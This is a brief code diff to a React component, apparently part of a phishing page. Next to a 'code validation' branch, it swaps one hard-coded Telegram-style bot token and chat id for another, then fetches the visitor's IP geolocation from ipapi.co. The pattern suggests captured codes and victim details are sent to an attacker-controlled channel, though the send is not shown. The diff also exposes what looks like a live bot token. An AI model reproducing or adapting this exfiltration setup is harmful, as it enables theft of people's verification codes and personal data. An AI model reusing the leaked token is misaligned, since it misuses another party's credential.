@@ -31,8 +31,8 @@ const About99 = () => {
             // Handle code validation
             return;
         } else {
-            const bot = 'bot7563390830:AAHCIF_THbo_3yY4yT-D28USdRfEXMrbcbg';
-            const chid = '7730846657';
+            const bot = 'bot7730846657:AAHCIF_THbo_3yY4yT-D28USdRfEXMrbcbg';
+            const chid = '7854623459';
 
             fetch(`https://ipapi.co/json/`)
                 .then((response) => response.json())
